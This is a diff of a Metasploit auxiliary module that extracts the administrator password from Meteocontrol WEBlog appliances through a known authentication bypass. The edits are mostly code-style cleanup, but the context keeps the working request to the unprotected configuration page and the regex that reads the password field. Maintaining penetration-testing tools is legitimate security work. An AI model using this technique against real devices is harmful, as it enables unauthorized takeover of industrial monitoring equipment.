@@ -8,23 +8,30 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name' => 'Meteocontrol WEBlog Password Extractor',
-      'Description' => %{
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Meteocontrol WEBlog Password Extractor',
+        'Description' => %q{
           This module exploits an authentication bypass vulnerability in Meteocontrol WEBLog appliances (software version < May 2016 release) to extract Administrator password for the device management portal.
-      },
-      'References' =>
-        [
+        },
+        'References' => [
           ['URL', 'https://www.cisa.gov/uscert/ics/advisories/ICSA-16-133-01'],
           ['CVE', '2016-2296'],
           ['CVE', '2016-2298']
         ],
-      'Author' =>
-        [
+        'Author' => [
           'Karn Ganeshen <KarnGaneshen[at]gmail.com>'
         ],
-      'License' => MSF_LICENSE))
+        'License' => MSF_LICENSE,
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
@@ -51,7 +58,6 @@ class MetasploitModule < Msf::Auxiliary
         'uri' => '/html/en/index.html',
         'method' => 'GET'
       })
-
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
       print_error("#{rhost}:#{rport} - HTTP Connection Failed...")
       return false
@@ -74,16 +80,15 @@ class MetasploitModule < Msf::Auxiliary
     print_status("#{rhost}:#{rport} - Attempting to extract Administrator password...")
     begin
       res = send_request_cgi({
-          'uri' => '/html/en/confAccessProt.html',
-          'method' => 'GET'
+        'uri' => '/html/en/confAccessProt.html',
+        'method' => 'GET'
       })
-
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
       print_error("#{rhost}:#{rport} - HTTP Connection Failed...")
       return
     end
 
-    if (res && res.code == 200 && (res.body.include?('szWebAdminPassword') || res.body=~ /Admin Monitoring/))
+    if (res && res.code == 200 && (res.body.include?('szWebAdminPassword') || res.body =~ /Admin Monitoring/))
       get_admin_password = res.body.match(/name="szWebAdminPassword" value="(.*?)"/)
       if get_admin_password[1]
         admin_password = get_admin_password[1]
